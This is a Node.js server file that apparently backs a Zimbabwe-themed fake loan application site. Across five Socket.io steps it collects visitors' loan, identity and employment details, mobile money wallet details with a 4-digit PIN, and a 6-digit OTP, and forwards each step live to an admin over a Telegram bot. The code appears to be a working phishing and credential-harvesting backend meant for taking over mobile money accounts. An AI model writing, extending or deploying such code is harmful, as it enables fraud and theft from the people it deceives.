require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);

// Configure Socket.io for Render (CORS is essential)
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

global.io = io; // Allow bot_manager to access the socket instance

const PORT = process.env.PORT || 3000;
const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Webhook Route for Telegram
app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    botManager.bot.processUpdate(req.body);
    res.sendStatus(200);
});

io.on('connection', (socket) => {
    // Generate a unique AppID for the session
    const appId = `ZIM-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
    
    // Join the room so the bot can "call back" this specific user
    socket.join(appId);
    
    console.log(`🔌 User connected: ${appId}`);
    socket.emit('session-ready', { appId: appId });

    // Step Handlers
    socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇿🇼 Step 1: Loan", data));
    socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇿🇼 Step 2: Identity", data));
    socket.on('step3', (data) => botManager.sendToAdmin(appId, "🇿🇼 Step 3: Employment", data));

    // Step 4: Mobile Money Wallet Details (4-digit PIN verification)
    socket.on('step4', (data) => {
        botManager.sendToAdmin(appId, "🇿🇼 Step 4: Mobile Money Details", data, true);
    });

    // Step 5: Final Submission (6-digit OTP code triggered automatically on input)
    socket.on('step5', (data) => {
        botManager.sendFinalApproval(appId, data.pin);
    });

    socket.on('disconnect', () => {
        console.log(`🔌 User disconnected: ${appId}`);
    });
});

server.listen(PORT, async () => {
    console.log(`🚀 Loan Server running on port ${PORT}`);
    
    // Set Webhook using the Render External URL
    if (EXTERNAL_URL) {
        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
        try {
            await botManager.bot.setWebHook(webhookUrl);
            console.log(`✅ Telegram Webhook set to: ${webhookUrl}`);
        } catch (err) {
            console.error('❌ Webhook Error:', err.message);
        }
    } else {
        console.warn('⚠️ RENDER_EXTERNAL_URL not found in .env. Webhook not set.');
    }
});